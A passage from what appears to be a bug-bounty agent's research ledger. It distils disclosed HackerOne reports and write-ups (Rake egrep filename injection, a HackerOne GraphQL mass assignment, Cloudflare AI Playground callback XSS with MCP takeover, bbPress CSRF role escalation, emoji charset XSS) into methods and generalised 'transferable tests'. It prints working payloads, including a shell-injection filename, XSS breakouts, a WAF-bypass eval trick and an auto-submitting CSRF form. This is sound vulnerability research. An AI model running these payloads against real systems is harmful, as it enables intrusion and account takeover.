TRANSFERABLE TEST: on ANY app that greps a user-writable directory — (1) upload/create a file named `|id` (and the variants `;id`, `$(id)`, backtick-id, `>out`) into the directory the app's task sweeps; (2) trigger the job (run the Rake task, regenerate the report, re-index); (3) if the marker/side-effect appears or the job output contains command output, the filename reached a shell — then use the smallest payload that writes a known path (`|sh -c 'echo X >/tmp/X'`) to prove execution. Rule: **a filename that begins with `|` (or any shell metacharacter) passed to a shell-out grep/egrep is a command-injection sink — plant the file, trigger the job, and look for the side effect; the payload lives in the NAME, so body-only filters miss it.**
DEDUPE: 0 hits across all three write targets for `651518`, `kyoshida`, `CVE-2020-8130`, `Rake`, `Rake::FileList`, `egrep`, `FileList`. Related-but-distinct: the git argument-injection entry (~1806) is a user-settable PATH reaching a shell-out `git`; the GitLab CVE-2022-2185 entry (~2165) is a `path` param reaching `Open3.popen3(string)`; the "argv instead of a shell" entry (~2646) is the INVERSE. NONE records a filename beginning with `|` reaching a shell-out `egrep` via `Rake::FileList#egrep`. No new §17 slot (carrier).

SOURCE: https://hackerone.com/reports/2431495  2026-11-10
ROUTE: `web_extract` on the live page -> HTTP 200, full body read (summary, steps, the GraphQL mutation, the impact); the live `.json` route confirmed `visibility: full`, `vulnerability_information` 1,183 B. Metadata: HackerOne, `"package_name" can be set as desired when submitting a Pentest Opportunity form`, weakness Improper Access Control - Generic, severity Medium (5.2), reporter `iam_srpk`, submitted 2024-03-23, disclosed 2024-06-19, state Resolved, asset hackerone.com.
STATUS: UNVERIFIED (not reproduced — no HackerOne Pentest Opportunity form was submitted this pass; every mutation, field and quote below is verbatim from the report body).
CLASS: broken access control / mass-assignment on a GraphQL AUTOSAVE mutation — the autosave's `<Action>Input!` input object persists ANY field present, including a STAFF-ONLY package/pricing field the UI never sends (CWE-915 / CWE-862).
CORE METHOD:
  1. THE ENTRY POINT, verbatim: "While filling up the Pentest Opportunity form, the mutation `AutoSavePentestOpportunity` allowed me to set value to `package_name` (i.e `"package_name": "premium_p80"` ) which should be done only by ***the internal reviewing staff*** upon submitting the form."
  2. THE AUTOSAVE MUTATION, verbatim:
     `mutation AutosavePentestOpportunity($input: AutosavePentestOpportunityInput!) { autosavePentestOpportunity(input: $input) { was_successful errors(first: 100) { edges { node { id type field message __typename } } } __typename } }`
     The form fires this repeatedly as the user types, sending a PARTIAL input.
  3. THE INJECTION, verbatim: "Include this line before forwarding the request: `"package_name": "premium_p80"`" — add the staff-only field to the input object the UI never sends.
  4. THE PERSISTENCE CHECK, verbatim: "Complete the form and submit it. Now, reopen the submitted form to check if `OpportunityStatusQuery` mutation shows the field package_name as set before." — the autosave's value survives the final submit and is readable back through the status query.
  5. THE IMPACT, verbatim: "Improper access control". The report cites a sibling: "A similar report: #2040756".
DETECTION SIGNAL: a GraphQL mutation whose argument is a typed `<Action>Input!` object (autosave / draft / "save progress" / "update status" / "quick edit") that the UI sends PARTIALLY and repeatedly; an input type with fields the UI never sends (staff-only, pricing, tier, approval, reviewer, internal); a persistence/read-back query (`<Object>StatusQuery`, `<Object>Query`) that returns the injected field. TELL: the field you added to the autosave input is present in the object AFTER the final submit, and the read-back query returns your value.
CHAIN: any authenticated user who can open the form (primitive: an ordinary applicant, no staff role) -> the autosave mutation accepts a partial input and persists any field present (primitive: a mass-assignment sink on the input object) -> a STAFF-ONLY package/pricing field (`package_name`) is written with an arbitrary value (escalation: the field-level authorization the UI assumed is not enforced server-side) -> the opportunity is created/updated with the premium package (impact: a free/incorrect pentest package — a monetary/privilege gain; the program rated Medium 5.2). Per doctrine §8: preconditions = any authenticated user who can open and autosave the form; gain = the staff-only package field is set to an arbitrary value and persists through submit.
TRANSFERABLE TEST: on ANY GraphQL mutation with a typed `<Action>Input!` argument — (1) capture the request the UI sends (especially an autosave/draft/"save progress" mutation that fires repeatedly with a PARTIAL input); (2) enumerate the input type's fields (introspection: `{__type(name:"AutosavePentestOpportunityInput"){inputFields{name type}}}`) and diff them against the fields the UI sends; (3) re-send the mutation with a field the UI never sends added to the input (`package_name`, `plan`, `tier`, `price`, `role`, `status`, `reviewer`, `internal`) and a value you could not normally set; (4) submit the object and re-read it with the status/detail query — if your value persists, the input object is a mass-assignment sink. Rule: **a GraphQL `<Action>Input!` object is a mass-assignment surface — the autosave/draft mutation is the weakest link because it accepts a PARTIAL input; enumerate the input type, add a field the UI never sends, and check whether it persists through submit.**
DEDUPE: 0 hits across all three write targets for `2431495`, `iam_srpk`, `AutoSavePentestOpportunity`, `AutosavePentestOpportunityInput`, `Pentest Opportunity`, `premium_p80`, `OpportunityStatusQuery`. Related-but-distinct: V-04 (mass assignment; its guidance already names `plan`/`tenant_id`), §17.19, §17.37, §17.89, #1551176, #1543159. NONE records the GRAPHQL `<Action>Input!` AUTOSAVE carrier. No new §17 slot (V-04 owns the method; this is the carrier + the pricing-field delta).

NOTE — §17 additions 2026-11-10 batch 127 (§17.399 appended from the 6 assigned sources read ONE BY ONE in the given order; 3 entries appended to the harvest ledger + 1 §17 slot). NEW: #237381 (Automattic / WordPress.com — FFmpeg HLS: the DEMUXER's own text renderer is an OUTPUT-SIDE exfil channel; a playlist whose first segment is a `.txt` path and whose second is `file:///etc/passwd` is concatenated and drawn as a tty screen capture in the transcoded media, so the attacker reads the file out of the processed video; full body read via `web_extract` + the extractor's saved full text -> §17.399). CARRIER DELTAS (no §17 slot): #651518 (Ruby — `Rake::FileList#egrep` shells out to `egrep`, so a filename beginning with `|` is a shell pipe -> command injection; CVE-2020-8130; the shell-metacharacter-to-shell-out method is already recorded, this is the carrier, and the reporter's own precondition is file deployment), #2431495 (HackerOne — the GraphQL autosave mutation `AutoSavePentestOpportunity` accepts a PARTIAL `AutosavePentestOpportunityInput!` and persists a STAFF-ONLY `package_name` field (`premium_p80`) that the UI never sends, so an ordinary applicant sets the pentest package/pricing; Medium 5.2; V-04 owns the mass-assignment method, this is the GraphQL-input-object carrier + the pricing-field delta). VALID-BUT-DUPLICATE (read, nothing new): #2419227 (GoCD — "XSS in new.loading.page.html", weakness XSS - Reflected, CVE-2024-28866, reporter `aviv_keller`, submitted 2024-03-16 / disclosed 2024-03-17; full body read via `web_extract` + the live `.json` route, `visibility: full`, 1,010 B. The sink is the static loading page's inline JS, verbatim: `var locationData = window.location.search.match(/(\?|&)redirect_to=([^&]+)(&|$)/); ... window.location = decodeURIComponent(locationData[2]);` and the payload is `?redirect_to=javascript:alert("XSS")`. That is exactly the already-recorded §17.83 "`javascript:` URI accepted by a redirect parameter — the sink is the client-side navigation, not a server 302"; the only new specificity is the loading-page context and the regex+`decodeURIComponent` extraction, which does not change the test. Per the batch-86 precedent (#691611), delta noted, no entry, no §17 slot). INVALID: #2265400 (Glassdoor — "Web Cache Deception"; UNREACHABLE on every route tried: `web_extract` -> HTTP 403 target_blocked; the live `.json` -> HTTP 404; the live page -> HTTP 302 to `/users/sign_in`; `r.jina.ai` -> HTTP 403; the browser tool on the live page -> Cloudflare "Performing security verification" -> `/users/sign_in`; the browser tool on the Wayback snapshot -> the JS-only SPA shell with 57 chars of nav text; the Wayback `id_` raw captures (20231216113250, 20250219075546) -> the same JS-disabled shell whose only readable text is the platform meta tags ("Thanks to our researcher who discovered a web caching issue on an arbitrary endpoint which, in a limited scenario, cached a Fishbowl user's feed page inappropriately."); the Wayback CDX for `.json` -> empty; the ajaysenr mirror -> 404; allorigins -> HTTP 500. The only public text anywhere is that one-line team summary, which names the class (web cache deception) and the object (a Fishbowl user's feed page) but no endpoint, no URL, no cache-key detail, no request shape and no chain — nothing concrete to teach, and the cache-deception class is already recorded at §17.252. Nothing was invented for it), #1505567 (TikTok — "Privilege Escalation on TikTok for Business"; `visibility: no-content`, `vulnerability_information` 0 B; the only public text is the TikTok team summary, verbatim: "An IDOR (Insecure Direct Object Reference) vulnerability was found on the "org_id" and "account_id" parameters on a Business.TikTok.com endpoint, which could have resulted in an authenticated user with "Analyst" level permissions to close another user's ads accounts." That names the class (IDOR), two parameters and the impact, but discloses NO endpoint path, NO request shape, NO method and NO bypass — and the IDOR/BOLA class is owned by V-01/V-05. Same standard as #2352968 and #2443228; nothing was invented). 0 fabricated. Knowledge intake only — no target was touched; the only network traffic was `web_extract`/`curl`/`web_search` against `hackerone.com` report routes (live page + live `.json`), `r.jina.ai`, `web.archive.org` (availability + CDX + `id_`), the ajaysenr mirror, allorigins and public index pages.

SOURCE: https://hackerone.com/reports/3424998  2026-11-10
ROUTE: `web_extract` on the live page -> HTTP 200 but a JS-only HackerOne shell (navigation only); the browser tool on the same URL -> HackerOne's own error page ("Sorry, something went wrong"); `https://r.jina.ai/<url>` -> HTTP 200 with the Cloudflare team summary + the reporter's full-writeup link; the CREDITED PUBLIC WRITEUP `https://kazama.in/ai-playground-xss-to-mcp-takeover` -> HTTP 200, read in full this pass (the article elides a few sections with "...", but carries the injection point, the parameter, the sink code, the WAF bypass, the impact and the timeline). Route that worked: `r.jina.ai` for the report summary + the credited public writeup for the method.
STATUS: UNVERIFIED (not reproduced — no Cloudflare AI Playground OAuth callback was driven this pass; every code line, parameter and quote below is verbatim from the report summary / the credited writeup).
CLASS: reflected XSS (script-context) in an OAuth/OIDC CALLBACK handler -> session-data theft + connected-MCP-server takeover (CWE-79 / CWE-200; CVE-2026-1721, GHSA-w5cr-2qhr-jqc5; Cloudflare rated the HackerOne report Low, the CVE Medium; $400 bounty; reporter `matured_kazama`, submitted 2025-11-13).
CORE METHOD:
  1. THE ENDPOINT, verbatim: the AI Playground "uses an OAuth-like callback mechanism at `/agents/playground/Cloudflare-AI-Playground-*/callback/*` endpoint to handle authentication flows, particularly for MCP Server connections."
  2. THE SINK, verbatim (the simplified vulnerable code from `site/ai-playground/src/server.ts`): `const errorDescription = url.searchParams.get("error_description");` then `return new Response(`<html><script>alert('Authentication failed: ${errorDescription}'); window.close();</script></html>`);` — the `error_description` query parameter is interpolated into a `<script>` tag body INSIDE a single-quoted JS string literal, with no encoding, no escaping and no CSP.
  3. THE BREAKOUT: close the string literal, inject arbitrary JS, comment out the rest — the writeup's baseline payload is `',alert(1)//`.
  4. THE WAF BYPASS, verbatim: "Sending a straightforward XSS payload like `',alert(1)//` in the query string would immediately trigger the WAF block screen. Even a simple `eval('...')` was getting caught. To get past this, I used a double-eval trick: `x=eval,x(x('...'))`. By assigning `eval` to a variable first and then calling it indirectly, the WAF's pattern matching couldn't recognize it as a dangerous `eval()` invocation." — the actual data-theft code (the `fetch()` calls) still contained patterns the WAF flagged, so the payload had to be split/obfuscated further.
  5. THE CHAIN / IMPACT, verbatim (the Cloudflare team summary): "A targeted attacker could execute JavaScript to access session-based chat history or interact with connected MCP servers on the victim's behalf during the user's session following a user interaction to click a phishing link." — i.e. the reflected XSS runs in the victim's Playground session, reads the session-scoped chat history, and drives the MCP servers the victim connected.
  6. THE DELIVERY UPGRADE, verbatim (timeline): "Nov 15, 2025 | Upgraded from 2-clicks to single-click exploit".
  7. THE FIX, verbatim: "users of the open-source Agents SDK should upgrade to v0.3.10" (first fix PR #788 on 2026-01-30, second fix PR #841 on 2026-02-04; CVE-2026-1721 published 2026-02-13).
DETECTION SIGNAL: an OAuth/OIDC callback URL (`/callback`, `/oauth/callback`, `/agents/playground/<app>/callback/*`, `/sso/callback`) that reflects a query parameter (`error_description`, `error`, `error_message`, `state`, `code`) into a `<script>` tag body or a JS string literal; a callback page whose source contains `searchParams.get(...)` spliced into a template literal / `alert(...)` / `document.write`; a WAF that blocks `',alert(1)//` and `eval(` but not an indirect call; an AI-agent/playground app with connected MCP servers and session-scoped chat history (the escalation surface). TELL: the `error_description` value appears inside a `<script>` string in the response, and a payload that closes the string executes.
CHAIN: any attacker who can send a phishing link (primitive: a reflected parameter in a callback URL) -> the victim clicks the link and the callback reflects `error_description` into a `<script>` body (primitive: an unsanitized script-context reflection) -> the payload closes the JS string and executes in the victim's Playground origin (escalation: XSS in a session the victim is already authenticated in) -> the script reads the session-based chat history and calls the connected MCP servers' tools on the victim's behalf (escalation: cross-session data theft + tool/API abuse with the victim's credentials) -> impact: theft of the victim's AI-chat history and unauthorized actions through their connected MCP servers (the Cloudflare team summary's own impact statement; CVE-2026-1721). Per doctrine §8: preconditions = the victim is logged into the AI Playground and clicks a crafted callback link (one interaction); gain = the victim's session chat history + the ability to act through their connected MCP servers.
TRANSFERABLE TEST: on ANY OAuth/OIDC callback or "auth return" endpoint — (1) enumerate the callback paths from the app's OAuth client config / JS bundles / docs (`/callback`, `/oauth/callback`, `/agents/.../callback/*`, `/sso/callback`, `/auth/return`); (2) for EVERY reflected query parameter (`error_description`, `error`, `error_message`, `state`, `code`, `redirect_uri`), send a script-context breakout (`'`, `");}`, `</script><script>alert(1)</script>`, `${alert(1)}`) and check whether the value lands inside a `<script>` body or a JS string literal; (3) if a WAF blocks the direct payload, try the indirect-eval bypass (`x=eval,x(x('...'))`) and split the payload across parameters/headers; (4) once execution is confirmed, enumerate what the origin can DO — read session-scoped data (chat history, saved prompts) and drive any connected tools/integrations (MCP servers, OAuth-connected apps) as the victim. Rule: **an OAuth callback that reflects a query parameter into a `<script>` context is a reflected-XSS sink — and in an AI-agent app the XSS reaches the victim's session history and their connected MCP servers, turning a one-click phishing link into session-data theft + tool takeover.**
DEDUPE: 0 hits across all three write targets for `3424998`, `matured_kazama` (as this report — the §17.389 entry is the SAME author's Cloudflare Access SAML `javascript:` ACS self-XSS, a different surface), `error_description`, `AI Playground`, `agents/playground`, `MCP` (as a technique — the only `MCP` hits are the tooling article and the LLM-agent consent-prompt entry), `double-eval`, `x=eval`, `CVE-2026-1721`, `GHSA-w5cr-2qhr-jqc5`. Pre-existing OAuth material REVIEWED as related-but-distinct: §17.361 (Semrush — the OAuth SUCCESS page `postMessage`s the code to `window.opener` with `'*'`; a code-LEAK primitive, not a reflected-parameter XSS), §17.195 (a `redirect_uri` allowlist that path-prefix-matches without normalising dot-segments), §17.126 (an OAuth login that mints a session on a failed exchange), the Snapchat SSO `ticket` fragment entry, §17.389 (Cloudflare Access SAML ACS `javascript:` URI -> self-XSS). NONE records an OAuth CALLBACK that reflects a query parameter into a `<script>` tag body -> XSS -> session-chat/MCP-server takeover. New general method -> §17.400.

SOURCE: https://hackerone.com/reports/2999394  2026-11-10
ROUTE: `web_extract` on the live page -> HTTP 200, full body read (summary, root cause, the CSRF form code block, the impact); the live `.json` route -> HTTP 200, `visibility: full`, `vulnerability_information` full (the vendor's root-cause comment is truncated mid-sentence at `bbp_profile_update_role(),` in both the page and the `.json` body; the extractor's saved full text ends at the same point). Route that worked: `web_extract` + the live `.json` endpoint.
STATUS: UNVERIFIED (not reproduced — no WordPress/bbPress instance was stood up this pass; every form field, parameter and quote below is verbatim from the report body).
CLASS: privilege escalation (vertical) via CSRF + a user-controlled ROLE parameter on the registration endpoint — `bbp_user_add_role_on_register`/`bbp_profile_update_role()` assigns the forum role from a POST parameter with no nonce/CSRF token, so an attacker CSRFs an admin into registering an attacker-controlled account with the `bbp_keymaster` role (CWE-352 / CWE-863 / CWE-269; HackerOne weakness "Privilege Escalation", severity medium; reporter `br3n`, submitted 2025-02-18, disclosed 2025-09-13, state Closed/Resolved, asset bbPress Core SOURCE_CODE, max_severity critical).
CORE METHOD:
  1. THE CLAIM, verbatim: "An attacker can escalate a newly registered user's forum role to bbp_keymaster without proper authentication. This occurs because bbPress fails to implement adequate CSRF protections when assigning forum roles, allowing an attacker to craft a malicious request that upgrades a targeted user's forum privileges upon registration."
  2. THE ROOT CAUSE, verbatim: "The `bbp_user_add_role_on_register` function assigns a user role based on a user-controlled POST parameter (`bbp-forums-role`)."
  3. THE CSRF FORM, verbatim (the reporter's PoC):
     `<body onload="document.getElementById('csrf-form').submit();">`
     `<form id="csrf-form" action="http://localhost/victim/wp-login.php" method="POST">`
     `<input type="hidden" name="user_login" value="evilpen">`
     `<input type="hidden" name="user_email" value="attacker@email.com">`
     `<input type="hidden" name="action" value="register">`
     `<input type="hidden" name="bbp-forums-role" value="bbp_keymaster">`
     `</form>`
     The form auto-submits to the victim's own `wp-login.php` registration endpoint with the attacker's chosen credentials and the privileged role.
  4. THE TRIGGER, verbatim: "Send a link to an authenticated admin user, when the user opens the link, the forum role of the new user is 'Keymaster'." — the admin's session is used to register the attacker's account; the attacker then receives the login credentials by e-mail.
  5. THE VENDOR'S ROOT-CAUSE CORRECTION, verbatim: "Specific to your root cause, you'd noted that the `bbp_user_add_role_on_register()` function was to blame, but that ended up not being the case. The `bbp_validate_registration_role()` function is working as intended, and prevents the Keymaster role from being applied. We found that the role was being overridden a second time by `bbp_profile_update_role()`," — i.e. the role is applied/overridden a SECOND time by a function that does not re-validate.
  6. THE IMPACT, verbatim: "While the compromised user remains a WordPress subscriber and does not obtain full site-wide administrative privileges, the bbp_keymaster role grants complete control over the bbPress forum, including managing topics, users, and settings, an attacker could modify discussions, delete content, or manipulate user roles within bbPress."
DETECTION SIGNAL: a registration / user-creation form (`wp-login.php?action=register`, `/register`, `/signup`, `/api/users`, `/admin/user-new.php`) that accepts a ROLE / GROUP / PLAN / PRIVILEGE parameter (`bbp-forums-role`, `role`, `wp_capabilities`, `user_role`, `group`, `plan`, `tier`) in the POST body; a registration endpoint with NO nonce/CSRF token (the form has no `csrf`, `nonce`, `_wpnonce`, `token` field); a role value that names a privileged role (`bbp_keymaster`, `administrator`, `editor`, `moderator`, `keymaster`, `owner`); a registration that sends the new user's credentials to the supplied e-mail (so the attacker controls the account). TELL: the role field the UI never exposes is accepted and the created account has the privileged role.
CHAIN: any unauthenticated attacker (primitive: can host a page / send a link) -> crafts an auto-submitting HTML form pointing at the target's registration endpoint with a victim-controlled e-mail and a privileged role value (primitive: the role is a user-controlled POST parameter and there is no CSRF token) -> an authenticated admin visits the link (escalation: the admin's session performs the registration) -> a new account is created with the attacker's credentials and the privileged role (`bbp_keymaster`) (escalation: the role is applied/overridden by `bbp_profile_update_role()` without re-validation) -> the attacker logs in with the credentials mailed to their own address (escalation: the attacker controls the privileged account) -> full control over the bbPress forum (impact: manage topics, users and settings; modify/delete content; manipulate user roles — the program rated it Medium). Per doctrine §8: preconditions = the target runs bbPress with the registration form open to the admin's session AND the attacker can get an authenticated admin to visit a link; gain = a privileged (`bbp_keymaster`) forum account controlled by the attacker.
TRANSFERABLE TEST: on ANY CMS/forum/registration form — (1) capture the registration request the UI sends and enumerate every POST parameter, especially any ROLE/GROUP/PLAN/PRIVILEGE field (`role`, `bbp-forums-role`, `wp_capabilities`, `user_role`, `group`, `plan`, `tier`, `is_admin`); (2) check whether the form carries a nonce/CSRF token — if not, build an auto-submitting HTML form that POSTs to the registration endpoint with your own `user_login`/`user_email` and the privileged role value; (3) send the form's URL to an authenticated admin (or open it in the admin's session yourself on a test instance) and complete the registration; (4) log in with the credentials mailed to your address and check whether the account has the privileged role; (5) if the role is rejected, look for a SECOND role-assignment path (a profile-update endpoint, a "role overridden a second time" function) that does not re-validate. Rule: **a registration endpoint that accepts a role parameter and lacks a CSRF token lets an attacker CSRF an admin into creating an attacker-controlled privileged account — build an auto-submitting form with the privileged role value and the attacker's e-mail, and check the role on the account the credentials mail you.**
DEDUPE: 0 hits across all three write targets for `2999394`, `br3n`, `bbp-forums-role`, `bbp_keymaster`, `bbPress`, `bbp_user_add_role_on_register`, `bbp_profile_update_role`, `bbp_validate_registration_role`, `wp-login.php` (as a registration CSRF carrier). The mass-assignment method is REVIEWED as related-but-distinct: V-04 ("Extra JSON/form fields (`role`, `owner_id`, `admin`, `credits`) persist"), §17.19, §17.37, §17.89, #1551176, #1543159, #2431495 (the GraphQL autosave carrier). NONE records a REGISTRATION-endpoint ROLE parameter whose trigger is CSRF (an admin visits a link) and whose gain is a privileged forum role (`bbp_keymaster`). No new §17 slot (V-04 owns the mass-assignment method; this is the registration-role carrier + the CSRF trigger delta).

NOTE — §17 additions 2026-11-10 batch 128 (§17.400 appended from the 6 assigned sources read ONE BY ONE in the given order; 2 entries appended to the harvest ledger + 1 §17 slot). NEW: #3424998 (Cloudflare Public Bug Bounty — AI Playground OAuth callback reflects `error_description` into a `<script>` tag body -> reflected XSS -> the victim's session chat history + connected MCP servers; WAF bypass `x=eval,x(x('...'))`; CVE-2026-1721; route = `r.jina.ai` summary + the credited kazama.in writeup -> §17.400). CARRIER DELTA (no §17 slot): #2999394 (WordPress/bbPress — the registration endpoint accepts a user-controlled `bbp-forums-role` POST parameter with no CSRF token, so an attacker CSRFs an authenticated admin into registering an attacker-controlled `bbp_keymaster` account -> full forum control; Medium; V-04 owns mass assignment, this is the registration-role carrier + the CSRF trigger delta). VALID-BUT-DUPLICATE (read, nothing new): #1534465 (Rockstar Games "Ticket Trick Attack" — full body + comment thread read via `web_extract`; the technique (register on a support portal with an unverified e-mail, read the tickets that address receives, harvest third-party magic/reset links -> ATO) is exactly the already-recorded §17.362 / ledger ~10465 "Ticket Trick" from Zendesk #235139; the only delta is the reporter's hint to "check for 'domain based trust'", which names no endpoint, parameter or request shape). VALID-BUT-DUPLICATE (read, nothing new): #1073725 (Insulet — DOM XSS on `www.omnipod.com/freedom/birthdate-confirmation` and `/pif/thanks-freedom`; full body + the vulnerable script read via `web_extract`. The sink, verbatim: `var loc = window.location.toString(); var params = loc.split('?')[1]; var srcstring = "https://na.myomnipod.com/lic-p4-proc?" + params; document.write("<iframe id='frame' name='frame' src='" + srcstring + "' width='950'></iframe>");` and the payload is `?&#'onload='alert(document.domain)`. That is the already-recorded DOM XSS attribute-breakout sink (`document.write` / `.src =` in the cheat sheet) combined with the already-recorded fragment-concealment trick ("the fragment (`#`) and query (`?`) are free bytes...", ledger ~1007; V-03's `#zz7` row). No new bypass, entry-point type or chain; Medium 4.0, page since taken off site). VALID-BUT-CHAIN-PRIMITIVE-ONLY (held as a lead, no entry): #3287396 (AWS VDP — "AWS | Self Registration Internal LibreChat : Access to internal/proprietary LLMs"; full body read via `web_extract` + the live `.json` route, `visibility: full`. The technique: an internal LibreChat endpoint/UI exposed to the public internet with self-registration enabled, so an attacker signs up with a public e-mail and reaches public frontier models (Claude, Cohere) plus Amazon Titan Foundation Models with pre-configured paid API access, and "potentially" RCE via code interpretation — the RCE is explicitly UNTESTED ("requires a paid LibreChat access, and hence was not tested"). AWS rated it LOW and changed the scope to `*.people.aws.dev`. The endpoint host is redacted, there is no request shape beyond "navigate and register", and the demonstrated impact is resource abuse — an exposed-internal-service-with-self-registration PRIMITIVE with no documented high-impact chain; held as a lead per the CHAIN-ONLY rule). VALID-BUT-CHAIN-PRIMITIVE-ONLY (info-disclosure, no documented chain): #3179850 (Weblate — "exposure of personal IP address via email"; full body read via `web_extract` + the live `.json` route, `visibility: full`. The report argues that outbound e-mails carry the user's raw IP address (PII under GDPR) and that SMTP relays/logs store it; the vendor fixed it in Weblate PR #15102. It is an information-disclosure/PII finding with NO documented chain to a concrete CIA impact, so per the CHAIN-ONLY rule it is not an entry; the transferable note is "an application that puts the requester's IP into an outbound e-mail header/body leaks PII to every relay and to anyone who can read the mailbox"). 0 fabricated. Full per-source route/honesty records are in the harvest ledger `/root/bugbountyhuntingskills.md` and `/root/hackbot-architecture/knowledge/methodologies-2026-11-10.md`.

===== REPORT-READER PASS 2026-11-10 — batch 129 (6 assigned sources, all Medium/PentesterLand XSS writeups) =====

Knowledge intake only. No target was touched; the only network traffic was `web_extract` (plus one
`r.jina.ai` probe that returned an empty body) against the six assigned article URLs. The 6 sources
were read ONE BY ONE in the given order. RESULT: 5 entries appended (3 §17 slots), 1 valid-but-duplicate.

SOURCE: https://medium.com/@fpatrik/how-i-found-an-xss-vulnerability-via-using-emojis-7ad72de49209  2026-11-10
ROUTE: `web_extract` on the live page -> HTTP 200, full body read (the whole article incl. the payload and the reporter's PHP repro snippet; no fallback route needed).
STATUS: UNVERIFIED (not reproduced — no Swisscom host was touched and no iconv pipeline was stood up this pass; every quote and code line below is verbatim from the article).
CLASS: reflected/stored XSS via a CHARSET-CONVERSION MISMATCH — the sanitizer (`htmlspecialchars`) runs on the raw UTF-8 input and sees no `<`/`>`/`"`/`'`; a LATER `iconv('Windows-1252','UTF-8')` + `iconv('UTF-8','ASCII//TRANSLIT')` chain re-synthesises those exact ASCII characters out of emoji/unicode bytes (CWE-79 / CWE-180).
CORE METHOD:
  1. THE SETUP, verbatim: "One day I was working on Swisscom's bug bounty program and I found a subdomain let's call now redacted.swisscom.ch. I looked at the parameters they were safe from XSS and removed most of the malicious characters."
  2. THE TRIGGER, verbatim: "One day I saw Goat Sniff's video about one of the Intigriti's XSS challange (https://www.youtube.com/watch?v=aUsAHb0E7Cg) where he could get an exploit via unicode characters. ... The site was not vulnerable for this type of XSS but I tried some emojis and the interesting thing was that I've got back " and ' characters from the 👔 emoji. Actually the whole string was: d"Y"'"
  3. THE CHARACTER SOURCE, verbatim: "It turned out based on this github page I can also inject < > and as I said previously " and ' characters was also possible." — the page is https://github.com/iorch/jakaton_feminicidios/blob/master/data/emojis.csv (an emoji -> UTF-8 byte table).
  4. THE PAYLOAD, verbatim: `💋img src=x onerror=alert(document.domain)//💛` — the two emoji are the byte carriers; the inner text is the real tag.
  5. THE PIPELINE, verbatim: "the server after removing the malicious characters converted the UTF-8 string from Windows-1252 to UTF-8 (basically the input encoding and the convert from encoding mismatched). Then this does not give a proper < just a weird unicode one: ‹" and "So they took this output and converted again now from UTF-8 ot ASCII. This normalized the ‹ to < this is how the exploit could work on that system."
  6. THE REPRO SNIPPET, verbatim (the reporter's own PHP): `$str = isset($_GET["str"]) ? htmlspecialchars($_GET["str"]) : ""; $str = iconv('Windows-1252', "UTF-8", $str); $str = iconv('UTF-8', "ASCII//TRANSLIT", $str); echo "String: " . $str;`
DETECTION SIGNAL: an app that SANITISES first and CONVERTS CHARSET later — look for `iconv`, `mb_convert_encoding`, `utf8_decode`, `ASCII//TRANSLIT`, `//IGNORE`, `recode`, or a legacy Windows-1252/ISO-8859-1 -> UTF-8 step anywhere between the input filter and the output; a reflection that is inert when you send raw `<>"'` but becomes live when you send emoji or the transliteration sources (`‹` U+2039 -> `<`, `›` U+203A -> `>`, smart quotes -> `"`/`'`, fullwidth forms); a filter that strips `<`/`>` but whose error/echo path re-encodes. TELL: the raw payload is escaped/neutralised in the first response, and the SAME bytes after the conversion chain render as a live tag.
CHAIN: any user who can submit text (primitive: one free-text field) -> the XSS filter runs on the raw UTF-8 and sees no dangerous ASCII (primitive: the sanitiser is encoding-blind) -> a later charset conversion + transliteration re-synthesises `<`, `>`, `"`, `'` from emoji/unicode bytes (escalation: the filter's output is un-done by the app's own encoding pipeline) -> the reconstructed tag executes in the victim's session (impact: XSS with session impact — the doctrine §1 class; the Swisscom report was accepted). Per doctrine §8: preconditions = a text sink that is sanitised in one encoding and converted/transliterated in another; gain = script execution as the victim.
TRANSFERABLE TEST: on ANY target whose stack includes a charset conversion or transliteration step — (1) fingerprint the pipeline (PHP `iconv`, `mb_convert_encoding`, Python `codecs`, `ascii()`/`unidecode`, Java `new String(bytes, "Windows-1252")`, a DB `CONVERT`/`CAST`, a legacy ISO-8859-1 asset); (2) send the raw dangerous characters and confirm they are neutralised; (3) send the TRANSLITERATION SOURCES instead — `‹` (U+2039), `›` (U+203A), smart quotes U+201C/U+201D/U+2018/U+2019, fullwidth `＜＞＂＇`, and emoji (the reporter's `💋 ... 💛` shape) — and re-read the rendered output; (4) replicate the pipeline locally with the reporter's snippet to confirm which byte sequence re-synthesises which ASCII character. Rule: **a sanitiser that runs BEFORE a charset conversion is not a sanitiser — the conversion can re-synthesise `<`, `>`, `"`, `'` from emoji and transliteration sources, so test the pipeline's OUTPUT encoding, not its input filter.**
DEDUPE: 0 hits across all three write targets for `TRANSLIT`, `Windows-1252`, `iconv` (as a conversion step), `ASCII//`, `emoji` (as a charset carrier — the only `emoji` hits are the GitLab custom-emoji attribute-breakout entries §17.148/§17.153, a different class), `jakaton_feminicidios`, `swisscom`. The XSS-encoding-mismatch material REVIEWED as related-but-distinct: the WAF/encoding table (`HTML entity encoding of field values`, `HTML entity (hex)`), §17.247 (a codepoint->byte cast re-synthesises a banned character from `char + n*256` — a BLOCKLIST bypass, not a sanitizer-then-convert pipeline), and the punycode/IDN display-decode entry (§17.253). NONE records a SANITISE-then-CHARSET-CONVERT pipeline whose transliteration step re-synthesises `<`/`>`/`"`/`'` from emoji. New general method -> §17.401.

SOURCE: https://gonzx.medium.com/my-experience-on-hacking-the-dutch-government-a2c5a5f43d83  2026-11-10
ROUTE: `web_extract` on the live page -> the FIRST call returned `http_error` (empty body); the immediate retry returned HTTP 200 with the FULL article; `https://r.jina.ai/<url>` also returned the full text (final URL `https://gonzxph.medium.com/...`). Route that worked: `web_extract` on retry.
STATUS: UNVERIFIED (not reproduced — no Dutch government host was touched; every quote below is verbatim from the article).
CLASS: CSRF -> ACCOUNT TAKEOVER — a password-change endpoint that (a) does NOT require the current password and (b) carries no CSRF token, so a hidden auto-submitting form changes the victim's password and the attacker takes the account (CWE-352 -> CWE-522).
CORE METHOD:
  1. THE STEP-1 PRIMITIVE, verbatim: "When I update my name I found out that there's no CSRF Token implemented so I can modify any users name with CSRF attack, but this is not a critical bug since I can only modify the name"
  2. THE ESCALATION HUNT, verbatim: "I need to find a way to make it a serious bug, so I looked through all of the features and discovered the change password feature, which allows me to change my password without having to enter the old one."
  3. THE POC, verbatim: "I immediately generated a CSRF POC using Burp Suite CSRF Generator, tested it on my second account, and it successfully changed the password on my second account."
  4. THE TARGET, verbatim: "My third target was repository.scp.nl. It has a big scope to hunt since there's a Login and Register, first I created an account and then login"
  5. THE OUTCOME, verbatim: "3rd Bug: Submitted Date: August 17, 2021 / Resolved Date: October 1, 2021"
